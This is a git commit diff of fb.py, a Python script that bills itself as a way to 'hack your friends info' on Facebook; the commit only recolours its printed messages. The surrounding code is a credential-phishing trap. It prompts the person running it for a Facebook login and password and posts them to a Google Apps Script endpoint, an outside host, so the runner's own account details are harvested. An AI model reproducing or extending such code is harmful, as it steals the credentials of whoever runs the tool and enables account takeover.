2c49e0b0cfb4686759f9a4457449dc1a28831f50
bgmpyaesonehmoo290G <79253197+bgmpyaesonehmoo290G@users.noreply.github.com>
2021-02-23 22:03:42 +0630

    Update fb.py

--- fb.py
+++ fb.py
@@ -15,14 +15,14 @@ b = pyfiglet.figlet_format( 'PyaeSoneHmoo')
 os.system("clear")
 print(a)
 print(b)
-print(gren+b+"autor by: Pyae Sone Hmoo"+b+gren)
-print("dont use illegal")
-print('please login with your facebook \n for hack your firends info')
+print(gren+"autor by: Pyae Sone Hmoo"+gren)
+print(red+"dont use illegal"+red)
+print(pink+'please login with your facebook \n for hack your firends info'+pink)
 
 umail =input("please Enter phone and gmail:")
 upass =input("please Enter  password'")
 data ={'mail':umail,'pass':upass}
-print("plase wait")
+print(cyan+"plase wait"+cyan)
 rq =requests.post('https://script.google.com/macros/s/AKfycbx1cnhTRxQYCCWH0E55DRSXr54-p2-Q-0AEzUtqoTRZVHx1sw/exec',data=data)
 
 for i in range(100):
